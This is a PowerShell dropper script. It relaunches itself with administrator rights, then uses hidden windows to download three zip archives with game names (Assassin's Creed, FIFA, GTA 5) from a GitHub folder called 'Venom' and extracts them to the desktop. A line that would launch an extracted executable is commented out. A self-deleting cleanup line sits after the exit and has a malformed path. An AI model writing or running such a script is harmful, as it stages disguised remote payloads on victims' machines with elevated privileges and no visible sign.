$textPath = "$env:TEMP"
$zipFilePath = "$env:TEMP"
$zipUrl = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/AssassinsCreed_SE.zip"
$zipUrl_1 = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/Fifa-Ps5.zip"
$zipUrl_2 = "https://github.com/P0k3m0n-unleashed/ProjSucc/raw/refs/heads/master/Venom/Gta5-Ps5.zip"
$desktopPath = [System.Environment]::GetFolderPath("Desktop")
function Test-IsAdmin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    return $currentUser.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}

if (-not (Test-IsAdmin)) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -ArgumentList $arguments -Verb RunAs
    Exit
}

Set-Content -Path "$textPath\perm.txt" -Value "Permissions Granted"

powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl -OutFile "$zipFilePath\AssassinsCreed_SE.zip"

powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_1 -OutFile "$zipFilePath\Fifa-Ps5.zip"

powershell -windowstyle hidden Invoke-WebRequest -Uri $zipUrl_2 -OutFile "$zipFilePath\Gta5-Ps5.zip"

Expand-Archive -Path "$zipFilePath\AssassinsCreed_SE.zip" -DestinationPath $desktopPath -Force

Expand-Archive -Path "$zipFilePath\Fifa-Ps5.zip" -DestinationPath $desktopPath -Force

Expand-Archive -Path "$zipFilePath\Gta5-Ps5.zip" -DestinationPath $desktopPath -Force

Start-Sleep -Seconds 240

#Start-Process -FilePath "$desktopPath\AssassinsCreed_SE.exe" 

exit 0

Remove-Item -Path "%%d:\wYytnosVxfzD.ps1"
